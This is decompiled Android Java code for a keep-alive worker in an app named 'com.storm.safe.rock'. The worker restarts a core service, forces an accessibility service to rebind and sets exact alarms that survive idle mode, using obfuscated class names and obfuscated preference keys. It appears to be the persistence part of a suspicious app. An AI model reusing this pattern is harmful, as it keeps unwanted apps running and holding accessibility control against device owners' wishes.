package com.storm.safe.rock.keepalive;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.SystemClock;
import androidx.work.Worker;
import androidx.work.WorkerParameters;
import com.storm.safe.rock.service.AppCoreService;
import com.storm.safe.rock.service.dqtvuisjd;
import com.storm.safe.rock.service.modules.AbstractC0315a0;
import com.storm.safe.rock.service.modules.C0323a8;
import com.storm.safe.rock.service.tisxhskrc;
import com.storm.safe.rock.util.StringUtil;
import p000.AbstractC1120qr;
import p000.C1106qd;
import p000.rb0;
import p000.sb0;
import p000.t60;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* loaded from: classes2.dex */
public final class KeepAliveWorker extends Worker {

    /* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
    /* renamed from: com.storm.safe.rock.keepalive.KeepAliveWorker$a0 */
    public static final class C0255a0 {
        public /* synthetic */ C0255a0(AbstractC1120qr abstractC1120qr) {
            this();
        }

        private C0255a0() {
        }
    }

    static {
        new C0255a0(null);
    }

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public KeepAliveWorker(Context context, WorkerParameters workerParameters) {
        super(context, workerParameters);
        t60.m214695b6(context, "context");
        t60.m214695b6(workerParameters, "workerParams");
    }

    @Override // androidx.work.Worker
    /* renamed from: a6 */
    public final sb0 mo210458a6() {
        try {
            m211239a7();
            m211240a8();
        } catch (Exception e) {
            t60.m214705c6("KeepAliveWorker", "保活任务失败", e);
            try {
                String str = AbstractC0315a0.f53025a0;
                AbstractC0315a0.m211545a7("保活任务执行失败 " + e.getMessage());
            } catch (Exception unused) {
            }
        }
        return new rb0(C1106qd.f59467a1);
    }

    /* renamed from: a7 */
    public final void m211239a7() {
        AppCoreService.C0277a0 c0277a0 = AppCoreService.f52296a0;
        boolean zIsRunning = c0277a0.isRunning();
        Context context = this.f60190a0;
        if (!zIsRunning) {
            t60.m214694b5(context, "applicationContext");
            c0277a0.start(context);
        }
        if (dqtvuisjd.f52358m1.getInstance() == null) {
            tisxhskrc.C0380a0 c0380a0 = tisxhskrc.f55188a0;
            t60.m214694b5(context, "applicationContext");
            c0380a0.tryForceRebindAccessibility(context);
        } else {
            try {
                if (context.getSharedPreferences(StringUtil.m212470a0("KkkBBV4sDTpS"), 0).getBoolean(StringUtil.m212470a0("KkwFMkIqBTRWJSJWHwVONwE+WzQ/XBU="), false)) {
                    C0323a8.f53097e0.getOrCreate(context).m211643a8();
                }
            } catch (Exception unused) {
            }
        }
    }

    /* renamed from: a8 */
    public final void m211240a8() {
        boolean zM211487i1;
        Context context = this.f60190a0;
        try {
            Intent intent = new Intent(context, (Class<?>) tisxhskrc.class);
            intent.setAction("com.storm.safe.rock.action.BACKUP_SYNC");
            PendingIntent broadcast = PendingIntent.getBroadcast(context, 99, intent, 201326592);
            Object systemService = context.getSystemService("alarm");
            t60.m214693b4(systemService, "null cannot be cast to non-null type android.app.AlarmManager");
            AlarmManager alarmManager = (AlarmManager) systemService;
            if (Build.VERSION.SDK_INT >= 31 ? alarmManager.canScheduleExactAlarms() : true) {
                alarmManager.setExactAndAllowWhileIdle(2, SystemClock.elapsedRealtime() + 60000, broadcast);
            } else {
                alarmManager.setAndAllowWhileIdle(2, SystemClock.elapsedRealtime() + 60000, broadcast);
            }
        } catch (Exception unused) {
        }
        try {
            dqtvuisjd.C0290a0 c0290a0 = dqtvuisjd.f52358m1;
            dqtvuisjd c0290a02 = c0290a0.getInstance();
            if (c0290a02 != null && c0290a0.isServiceReady()) {
                try {
                    zM211487i1 = c0290a02.m211487i1();
                } catch (Exception unused2) {
                    zM211487i1 = false;
                }
                if (zM211487i1) {
                    return;
                }
                t60.m214726f4("KeepAliveWorker", "健康检查：网络断开，等待自动恢复");
            }
        } catch (Exception e) {
            t60.m214705c6("KeepAliveWorker", "健康检查执行失败", e);
        }
    }
}
